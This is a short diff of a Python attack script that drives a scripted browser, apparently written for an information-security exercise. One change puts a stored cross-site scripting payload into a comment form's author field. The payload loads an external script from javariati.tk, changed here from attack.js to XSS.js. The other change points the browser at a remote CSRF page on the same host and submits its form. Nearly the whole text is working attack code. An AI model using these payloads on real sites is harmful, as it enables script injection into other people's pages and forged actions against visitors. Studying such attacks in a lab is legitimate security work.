@@ -117,7 +117,7 @@ while exit != "y":
 
                 print()
                 print("Injecting the script")
-                browser.form['comment_author'] = '<script src="http://javariati.tk/matteo/InfoSec/attack.js"></script>Mario Rossi'
+                browser.form['comment_author'] = '<script src="http://javariati.tk/matteo/InfoSec/XSS.js"></script>Mario Rossi'
                 browser.form['comment_email'] = 'mario.rossi@gmail.com'
                 browser.form['comment_content'] = 'Nice'
 
@@ -205,7 +205,7 @@ while exit != "y":
             print()
             
             #open malicious html page
-            browser.open("file:///" + os.getcwd() + "/index.html")
+            browser.open("http://javariati.tk/matteo/InfoSec/CSRF.html")
             
             browser.select_form(nr = 0)
             browser.submit() 
